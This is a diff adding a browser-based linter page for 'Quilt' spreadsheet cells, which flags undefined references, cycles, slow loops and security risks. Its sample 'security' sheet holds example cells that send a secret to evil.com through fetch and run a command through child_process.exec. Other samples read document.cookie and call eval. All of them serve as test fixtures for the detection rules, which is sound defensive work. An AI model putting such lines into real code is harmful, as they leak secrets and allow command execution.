@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sheet linter — find issues in Quilt sheets</title>
+<style>
+:root{
+  --bg:#0a0a14;--panel:#14141f;--pe:#1a1a26;--b:#252535;--bs:#353548;
+  --t:#f0f0f5;--td:#a0a0b0;--tf:#6a6a7a;
+  --a1:#7c3aed;--a2:#3b82f6;--a3:#10b981;--a4:#f59e0b;--err:#ff6b6b;--warn:#fbbf24;
+  --ok:rgba(16,185,129,.1);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{background:var(--bg);color:var(--t);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;line-height:1.5;font-size:14px;overflow-x:hidden}
+.m{font-family:'JetBrains Mono','SF Mono',monospace}
+.wrap{max-width:1300px;margin:0 auto;padding:18px 22px}
+.top{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:8px}
+h1{font-size:1.4rem;font-weight:800}
+h1 .accent{background:linear-gradient(135deg,var(--a1) 0%,var(--a2) 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+h2{font-size:1rem;margin:14px 0 9px;color:var(--a3)}
+p{color:var(--td);margin-bottom:11px;font-size:.85rem}
+.nav{background:rgba(124,58,237,.05);border:1px solid var(--b);border-radius:7px;padding:9px 11px;margin-bottom:14px;font-size:.78rem}
+.nav a{color:var(--a2);text-decoration:none;margin-right:11px}
+.nav a:hover{text-decoration:underline}
+.nav a.cur{color:var(--a3);font-weight:700}
+.coffee-top{background:linear-gradient(135deg,#FFDD00 0%,#fbbf24 100%);color:#422006;padding:6px 12px;border-radius:5px;font-weight:700;font-size:.74rem;text-decoration:none}
+.coffee-top:hover{filter:brightness(1.1);color:#422006}
+.layout{display:grid;grid-template-columns:1fr 1fr;gap:13px;margin-bottom:14px}
+@media (max-width:900px){.layout{grid-template-columns:1fr}}
+.panel{background:var(--panel);border:1px solid var(--b);border-radius:9px;padding:14px}
+.panel h3{font-size:.92rem;color:var(--a3);margin-bottom:9px;display:flex;justify-content:space-between;align-items:center}
+button{background:linear-gradient(135deg,var(--a1) 0%,var(--a2) 100%);color:#fff;border:0;padding:7px 13px;border-radius:5px;font-weight:700;cursor:pointer;font-size:.78rem}
+button:hover{filter:brightness(1.1)}
+button.secondary{background:var(--pe);border:1px solid var(--b);color:var(--t)}
+textarea{width:100%;background:var(--bg);color:var(--t);border:1px solid var(--b);border-radius:6px;padding:11px;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.5;min-height:380px;resize:vertical}
+textarea:focus{outline:none;border-color:var(--a2)}
+.summary{background:var(--panel);border:1px solid var(--b);border-radius:9px;padding:14px;margin-bottom:14px;display:grid;grid-template-columns:repeat(4,1fr);gap:9px}
+.summary .stat{text-align:center}
+.summary .v{font-size:1.5rem;font-weight:800;font-family:'JetBrains Mono',monospace}
+.summary .err{color:var(--err)}
+.summary .warn{color:var(--warn)}
+.summary .info{color:var(--a2)}
+.summary .ok{color:var(--a3)}
+.summary .l{font-size:.65rem;color:var(--td);text-transform:uppercase;letter-spacing:.04em;margin-top:2px}
+.issues{background:var(--panel);border:1px solid var(--b);border-radius:9px;padding:14px;max-height:600px;overflow-y:auto}
+.issue{background:var(--bg);border:1px solid var(--b);border-radius:6px;padding:11px;margin-bottom:7px;font-size:.78rem;display:grid;grid-template-columns:70px 1fr;gap:9px}
+.issue.err{border-left:3px solid var(--err)}
+.issue.warn{border-left:3px solid var(--warn)}
+.issue.info{border-left:3px solid var(--a2)}
+.issue .sev{font-weight:700;font-size:.7rem;text-transform:uppercase;text-align:center;padding:3px;border-radius:3px}
+.issue.err .sev{background:var(--err);color:#fff}
+.issue.warn .sev{background:var(--warn);color:#0a0a14}
+.issue.info .sev{background:var(--a2);color:#fff}
+.issue .what{color:var(--t)}
+.issue .what .path{color:var(--a3);font-weight:700;font-family:'JetBrains Mono',monospace}
+.issue .what .rule{color:var(--a4);font-family:'JetBrains Mono',monospace;font-size:.7rem;background:var(--pe);padding:1px 4px;border-radius:2px;margin-left:5px}
+.issue .what .msg{margin-top:3px}
+.issue .what .fix{color:var(--a2);font-size:.72rem;margin-top:5px;font-family:'JetBrains Mono',monospace}
+.empty{text-align:center;padding:20px;color:var(--tf);font-style:italic;font-size:.78rem}
+.presets{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:11px}
+.preset{background:var(--pe);border:1px solid var(--b);color:var(--t);padding:4px 9px;border-radius:11px;font-size:.7rem;cursor:pointer;font-family:'JetBrains Mono',monospace}
+.preset:hover{border-color:var(--a2)}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="top">
+  <div>
+    <h1>🧹 <span class="accent">Sheet linter</span> <span style="color:var(--td);font-size:.82rem;font-weight:400">— find issues in Quilt sheets</span></h1>
+    <p style="margin-top:3px">Paste a Quilt sheet. Find issues: missing cells, undefined refs, type mismatches, performance smells, security risks.</p>
+  </div>
+  <a class="coffee-top" href="https://www.buymeacoffee.com/CaseyDiGennaro" target="_blank">☕ Buy Casey a Coffee</a>
+</div>
+
+<div class="nav">
+  <a href="index.html">Home</a>
+  <a href="workspace.html">Workspace</a>
+  <a href="playground.html">Playground</a>
+  <a href="benchmark.html">Benchmark</a>
+  <a href="regex.html">Regex</a>
+  <a href="diff.html">Diff</a>
+  <a href="reflex-tracer.html">Reflex tracer</a>
+  <a href="lint.html" class="cur">Lint</a>
+  <a href="ai-sheet.html">AI sheet</a>
+  <a href="pincher.html">Pincher</a>
+  <a href="vibe.html">Vibe</a>
+</div>
+
+<div class="presets">
+  <span class="preset" data-ex="good">Clean sheet</span>
+  <span class="preset" data-ex="missing">Missing deps</span>
+  <span class="preset" data-ex="circular">Circular ref</span>
+  <span class="preset" data-ex="perf">Perf issues</span>
+  <span class="preset" data-ex="security">Security risks</span>
+</div>
+
+<div class="layout">
+  <div class="panel">
+    <h3>Sheet source <button id="lint-btn">▶ Lint</button></h3>
+    <textarea id="input" spellcheck="false"></textarea>
+  </div>
+  <div class="panel">
+    <h3>Issues <span id="issue-count" style="font-size:.7rem;color:var(--td)">—</span></h3>
+    <div class="issues" id="issues">
+      <div class="empty">Click "Lint" to analyze the sheet.</div>
+    </div>
+  </div>
+</div>
+
+<div class="summary" id="summary" style="display:none">
+  <div class="stat"><div class="v err" id="s-err">0</div><div class="l">errors</div></div>
+  <div class="stat"><div class="v warn" id="s-warn">0</div><div class="l">warnings</div></div>
+  <div class="stat"><div class="v info" id="s-info">0</div><div class="l">info</div></div>
+  <div class="stat"><div class="v ok" id="s-cells">0</div><div class="l">cells</div></div>
+</div>
+
+</div>
+
+<script>
+// ─────────────────────────────────────────────────────────────────
+//  Lint rules
+// ─────────────────────────────────────────────────────────────────
+
+const SAMPLES = {
+  good: {
+    name: 'clean',
+    cells: [
+      { path: 'a', kind: 'value', value: 1 },
+      { path: 'b', kind: 'value', value: 2 },
+      { path: 'sum', kind: 'formula', fn: '(ctx) => ctx.a + ctx.b' },
+    ],
+  },
+  missing: {
+    name: 'missing',
+    cells: [
+      { path: 'a', kind: 'value', value: 1 },
+      { path: 'sum', kind: 'formula', fn: '(ctx) => ctx.a + ctx.b + ctx.c' },  // b and c missing
+      { path: 'orphan', kind: 'formula', fn: '(ctx) => ctx.never + 1' },  // never missing
+    ],
+  },
+  circular: {
+    name: 'circular',
+    cells: [
+      { path: 'a', kind: 'formula', fn: '(ctx) => ctx.b + 1' },
+      { path: 'b', kind: 'formula', fn: '(ctx) => ctx.a + 1' },
+    ],
+  },
+  perf: {
+    name: 'perf',
+    cells: [
+      { path: 'a', kind: 'value', value: 1 },
+      { path: 'b', kind: 'formula', fn: '(ctx) => { let s = 0; for (let i = 0; i < 1000000; i++) s += i; return ctx.a + s; }' },
+      { path: 'c', kind: 'formula', fn: '(ctx) => eval(ctx.a)' },
+      { path: 'd', kind: 'formula', fn: '(ctx) => document.cookie' },
+    ],
+  },
+  security: {
+    name: 'security',
+    cells: [
+      { path: 'a', kind: 'value', value: 'secret' },
+      { path: 'exfil', kind: 'formula', fn: '(ctx) => fetch("https://evil.com?" + ctx.a)' },
+      { path: 'exec', kind: 'formula', fn: '(ctx) => require("child_process").exec(ctx.a)' },
+    ],
+  },
+};
+
+const RULES = [
+  {
+    id: 'undefined-ref',
+    sev: 'err',
+    check: (sheet) => {
+      const paths = new Set(sheet.cells.map((c) => c.path));
+      const issues = [];
+      for (const c of sheet.cells) {
+        if (c.kind !== 'formula' && c.kind !== 'program') continue;
+        const refs = (c.fn || '').matchAll(/ctx\.(\w+)/g);
+        for (const r of refs) {
+          if (!paths.has(r[1]) && r[1] !== c.path) {
+            issues.push({ path: c.path, msg: `references undefined ctx.${r[1]}`, fix: `add a cell at path "${r[1]}"` });
+          }
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'circular',
+    sev: 'err',
+    check: (sheet) => {
+      // Build dependency graph
+      const paths = new Set(sheet.cells.map((c) => c.path));
+      const deps = new Map();
+      for (const c of sheet.cells) {
+        if (c.kind !== 'formula' && c.kind !== 'program') { deps.set(c.path, []); continue; }
+        const refs = (c.fn || '').matchAll(/ctx\.(\w+)/g);
+        const set = new Set();
+        for (const r of refs) set.add(r[1]);
+        deps.set(c.path, Array.from(set));
+      }
+      // DFS for cycles
+      const issues = [];
+      const color = new Map();
+      const cycle = (node, stack) => {
+        if (color.get(node) === 'gray') {
+          const start = stack.indexOf(node);
+          issues.push({ path: node, msg: `circular dependency: ${stack.slice(start).join(' → ')} → ${node}`, fix: 'break the cycle by removing one of the references' });
+          return;
+        }
+        if (color.get(node) === 'black') return;
+        color.set(node, 'gray');
+        stack.push(node);
+        for (const d of deps.get(node) || []) {
+          if (paths.has(d)) cycle(d, stack);
+        }
+        stack.pop();
+        color.set(node, 'black');
+      };
+      for (const p of paths) {
+        if (!color.get(p)) cycle(p, []);
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'no-fn',
+    sev: 'warn',
+    check: (sheet) => {
+      const issues = [];
+      for (const c of sheet.cells) {
+        if ((c.kind === 'formula' || c.kind === 'program') && !c.fn) {
+          issues.push({ path: c.path, msg: `${c.kind} cell has no fn property`, fix: 'add an "fn" string that returns a value' });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'no-listens',
+    sev: 'warn',
+    check: (sheet) => {
+      const issues = [];
+      for (const c of sheet.cells) {
+        if (c.kind === 'listener' && !c.listens) {
+          issues.push({ path: c.path, msg: 'listener cell has no "listens" property', fix: 'add a "listens" string with the path of the cell to watch' });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'eval',
+    sev: 'err',
+    check: (sheet) => {
+      const issues = [];
+      for (const c of sheet.cells) {
+        if (c.fn && /\beval\s*\(/.test(c.fn)) {
+          issues.push({ path: c.path, msg: 'uses eval() — arbitrary code execution risk', fix: 'replace with a specific function call' });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'fetch',
+    sev: 'warn',
+    check: (sheet) => {
+      const issues = [];
+      for (const c of sheet.cells) {
+        if (c.fn && /\bfetch\s*\(/.test(c.fn)) {
+          issues.push({ path: c.path, msg: 'uses fetch() — exfiltration risk if ctx has secrets', fix: 'use an API cell with explicit allow-list' });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'require',
+    sev: 'err',
+    check: (sheet) => {
+      const issues = [];
+      for (const c of sheet.cells) {
+        if (c.fn && /\brequire\s*\(/.test(c.fn)) {
+          issues.push({ path: c.path, msg: 'uses require() — not available in sandboxed cells', fix: 'use a builtin or pass dependencies in via context' });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'cookie',
+    sev: 'err',
+    check: (sheet) => {
+      const issues = [];
+      for (const c of sheet.cells) {
+        if (c.fn && /document\.cookie/.test(c.fn)) {
+          issues.push({ path: c.path, msg: 'accesses document.cookie — potential credential leak', fix: 'use a session API cell' });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'expensive-loop',
+    sev: 'warn',
+    check: (sheet) => {
+      const issues = [];
+      for (const c of sheet.cells) {
+        if (c.fn && /for\s*\([^)]*;\s*\w+\s*<\s*\d{6,}/.test(c.fn)) {
+          issues.push({ path: c.path, msg: 'expensive loop (>1M iterations) — will slow evaluation', fix: 'precompute outside the cell or use a smaller range' });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'duplicate-path',
+    sev: 'err',
+    check: (sheet) => {
+      const issues = [];
+      const seen = new Map();
+      for (const c of sheet.cells) {
+        if (seen.has(c.path)) {
+          issues.push({ path: c.path, msg: `duplicate path — also defined at cell #${seen.get(c.path) + 1}`, fix: 'rename one of the cells' });
+        } else {
+          seen.set(c.path, sheet.cells.indexOf(c));
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'unknown-kind',
+    sev: 'warn',
+    check: (sheet) => {
+      const known = new Set(['value', 'formula', 'program', 'listener', 'api', 'ai', 'sensor', 'router']);
+      const issues = [];
+      for (const c of sheet.cells) {
+        if (c.kind && !known.has(c.kind)) {
+          issues.push({ path: c.path, msg: `unknown kind "${c.kind}" — may not be supported by all runtimes`, fix: `use one of: ${Array.from(known).join(', ')}` });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'orphan-listener',
+    sev: 'info',
+    check: (sheet) => {
+      const issues = [];
+      const paths = new Set(sheet.cells.map((c) => c.path));
+      for (const c of sheet.cells) {
+        if (c.kind === 'listener' && c.listens && c.listens !== '_' && !paths.has(c.listens)) {
+          issues.push({ path: c.path, msg: `listens on "${c.listens}" which doesn't exist`, fix: `add a cell at "${c.listens}" or change the "listens" property` });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'unused',
+    sev: 'info',
+    check: (sheet) => {
+      const issues = [];
+      const used = new Set();
+      for (const c of sheet.cells) {
+        if (c.fn) {
+          const refs = (c.fn.matchAll(/ctx\.(\w+)/g));
+          for (const r of refs) used.add(r[1]);
+        }
+      }
+      for (const c of sheet.cells) {
+        if (c.kind === 'value' && !used.has(c.path)) {
+          issues.push({ path: c.path, msg: 'value cell is never referenced', fix: 'remove if not needed, or reference it from a formula' });
+        }
+      }
+      return issues;
+    },
+  },
+  {
+    id: 'long-fn',
+    sev: 'info',
+    check: (sheet) => {
+      const issues = [];
+      for (const c of sheet.cells) {
+        if (c.fn && c.fn.length > 200) {
+          issues.push({ path: c.path, msg: `fn is ${c.fn.length} chars — consider splitting into helper cells`, fix: 'extract sub-computations into separate cells' });
+        }
+      }
+      return issues;
+    },
+  },
+];
+
+// ─────────────────────────────────────────────────────────────────
+//  Render
+// ─────────────────────────────────────────────────────────────────
+
+const $input = document.getElementById('input');
+const $issues = document.getElementById('issues');
+const $summary = document.getElementById('summary');
+
+function escapeHtml(s) {
+  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+
+function lint() {
+  let sheet;
+  try {
+    sheet = JSON.parse($input.value);
+  } catch (e) {
+    $issues.innerHTML = `<div class="empty" style="color:var(--err)">JSON parse error: ${escapeHtml(e.message)}</div>`;
+    return;
+  }
+  if (!sheet.cells || !Array.isArray(sheet.cells)) {
+    $issues.innerHTML = '<div class="empty" style="color:var(--err)">Sheet has no "cells" array</div>';
+    return;
+  }
+  const allIssues = [];
+  for (const rule of RULES) {
+    try {
+      const found = rule.check(sheet);
+      for (const f of found) {
+        allIssues.push({ ...f, rule: rule.id, sev: rule.sev });
+      }
+    } catch (e) {
+      allIssues.push({ path: '(rule)', msg: `rule ${rule.id} errored: ${e.message}`, sev: 'warn', rule: rule.id });
+    }
+  }
+  // Sort by severity
+  const order = { err: 0, warn: 1, info: 2 };
+  allIssues.sort((a, b) => order[a.sev] - order[b.sev]);
+  // Summary
+  $summary.style.display = 'grid';
+  document.getElementById('s-err').textContent = allIssues.filter((i) => i.sev === 'err').length;
+  document.getElementById('s-warn').textContent = allIssues.filter((i) => i.sev === 'warn').length;
+  document.getElementById('s-info').textContent = allIssues.filter((i) => i.sev === 'info').length;
+  document.getElementById('s-cells').textContent = sheet.cells.length;
+  document.getElementById('issue-count').textContent = `${allIssues.length} issue(s)`;
+  // Render
+  if (allIssues.length === 0) {
+    $issues.innerHTML = '<div class="empty" style="color:var(--a3)">✓ Sheet is clean. No issues found.</div>';
+  } else {
+    $issues.innerHTML = allIssues.map((i) => `
+      <div class="issue ${i.sev}">
+        <div class="sev">${i.sev}</div>
+        <div class="what">
+          <span class="path">${escapeHtml(i.path)}</span>
+          <span class="rule">${i.rule}</span>
+          <div class="msg">${escapeHtml(i.msg)}</div>
+          ${i.fix ? `<div class="fix">→ ${escapeHtml(i.fix)}</div>` : ''}
+        </div>
+      </div>
+    `).join('');
+  }
+}
+
+// Wire up
+document.getElementById('lint-btn').addEventListener('click', lint);
+document.querySelectorAll('.preset').forEach((el) => {
+  el.addEventListener('click', () => {
+    $input.value = JSON.stringify(SAMPLES[el.dataset.ex], null, 2);
+    lint();
+  });
+});
+
+// Boot
+$input.value = JSON.stringify(SAMPLES.good, null, 2);
+lint();
+</script>
+</body>
+</html>
